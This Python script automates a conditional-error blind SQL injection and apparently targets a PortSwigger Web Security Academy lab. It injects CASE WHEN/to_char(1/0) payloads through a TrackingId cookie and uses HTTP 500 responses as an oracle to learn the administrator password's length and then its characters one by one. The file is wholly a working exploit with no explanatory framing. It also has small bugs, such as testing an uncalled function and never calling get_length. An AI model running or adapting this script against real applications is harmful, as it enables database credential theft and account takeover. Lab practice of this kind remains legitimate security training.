import requests
from pwn import * 

#Cookie: TrackingId=cUnp1Gkl2HtZ4Jyi; session=dkPDdDnDrJzIT2wJYQGR2CYgbeWn2sMh
host='0a5f00260317a2598084080f008000f7.web-security-academy.net'
letters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$&\()*+-/<=>?@[\\]^_{|}~'
session='vatnhheubjCkJQiDU81szcO7Kn9xoG7A'
TrackingId='0Ae80vwaBWjKDDF2'
url_main=f'https://{host}'
url_request=f'{url_main}/filter?category=Gifts'

#payload = "cUnp1Gkl2HtZ4Jyi' AND (SELECT SUBSTR(schema_name,1,1) FROM information_schema.schemata='u')"

def ctrl_C(signal, frame):
    print('[+] exit')
    exit(1)

def valid_sql_injection():
    payload = "%s' order by 1--" % (TrackingId)
    return send_request(payload)


def get_name_credentials(letters):
    if valid_sql_injection:
        p1=log.progress('Brute Force')
        p2=log.progress('Password')
        password=''
        start=1
        while True:
            for word in letters:
                payload = "%s' ||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'" %(TrackingId,start,word)
                p1.status('Postition: %d Letters: %s' % (start, word))
                if send_request(payload):
                    password+=word
                    break
                p2.status('%s' % (password))
            if len(password)!=start:
                break
            start+=1

    else:
        print('[+] Error, sql injection not found ')

def get_length():
#Cookie: TrackingId=g07i91BPKI1dQniE'||(SELECT CASE WHEN LENGTH(password)>2 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=a040K3Y9ebPhz4T2VeQbhtUbAuK69loZ
    number=1
    p2=log.progress('Enumerations length password')
    while True:
        payload = "%s' ||(SELECT CASE WHEN LENGTH(password)>%d THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'" %(TrackingId,number)
        p2.status('Number  %d' % (number))
        if send_request(payload):
            length=number
            break
        else:
            number+=1

    return length

def send_request(payload):
    
    cookies = {
          'TrackingId': payload,
          'session': session
          }
    #' AND (SELECT ASCII(SUBSTRING(database(),{i},1)))={j}--
    headers = {
          'Host':host ,
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
          'Accept-Language': 'es-ES,es;q=0.5',
          'Accept-Encoding': 'gzip, deflate, br',
          'Dnt': '1',
          'Referer': url_request,
          'Upgrade-Insecure-Requests': '1',
          'Sec-Fetch-Dest': 'document',
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-Site': 'same-origin',
          'Sec-Fetch-User': '?1',
          'Te': 'trailers'
          }
    try:

        response = requests.get(url_request,headers=headers, cookies=cookies)
        
        if response.status_code==500:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        #print(f"An error occurred: {e}")
        return False
        


if __name__ == "__main__":
    signal.signal(signal.SIGINT,ctrl_C)
    get_name_credentials(letters)